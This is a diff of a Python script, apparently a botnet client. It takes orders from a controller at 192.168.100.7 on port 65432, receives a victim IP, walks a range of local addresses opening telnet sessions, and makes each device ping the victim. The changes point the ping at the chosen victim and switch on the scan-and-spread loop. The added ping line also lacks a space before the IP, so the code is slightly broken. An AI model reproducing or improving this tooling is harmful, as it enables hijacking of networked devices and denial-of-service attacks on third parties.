@@ -42,7 +42,8 @@ def telnetConnect(ip_address, victimIP, attackType):
 
             if attackType == '1':  # note
                 print('pingujemy..')
-                tn.write(b"ping 192.168.100.7\n")
+                bfile = bytes(victimIP.encode())
+                tn.write(b"ping"+ bfile + b"\n")
                 if not attack:
                     print("stopping attack")
                     return
@@ -127,14 +128,14 @@ def checkForOtherDevices(ip, victimIP):
     ip = ip[:l - len(g)]
     print('connecting to telnet...')
     start_new_thread(telnetConnect, ("192.168.100.8", victimIP, attack_type))
-    # while x < 254:
-    #     if not attack:
-    #         return
-    #     current_address = ip + str(x)
-    #     # próbuj połączyć z każdym przez telnet
-    #     # print(current_address)
-    #     start_new_thread(telnetConnect, (current_address, victimIP, 2))
-    #     x += 1
+    while x < 20:
+        if not attack:
+            break
+        current_address = ip + str(x)
+        # próbuj połączyć z każdym przez telnet
+        print(current_address)
+        start_new_thread(telnetConnect, (current_address, victimIP, attack_type))
+        x += 1
 
     print('finished')
 
@@ -142,7 +143,7 @@ def checkForOtherDevices(ip, victimIP):
 if __name__ == '__main__':
 
     # HOST = '192.168.100.11'  # The server's hostname or IP address
-    HOST = '127.0.0.1'
+    HOST = '192.168.100.7'
     h=HOST
     PORT = 65432  # The port used by the server
 
@@ -183,11 +184,12 @@ if __name__ == '__main__':
                     attack_type = data
                     victimIP = str(s.recv(16).decode())
                     print('victim address:' + str(victimIP))
-                    checkForOtherDevices(HOST, victimIP)
                     attack = True
+                    checkForOtherDevices(HOST, victimIP)
+
                 else:
                     print('something went wrong')
-                # todo:zrobić try zeby sie nie wywalilo
+
                 stop = str(s.recv(1).decode())
                 if stop == '0':
                     attack = False
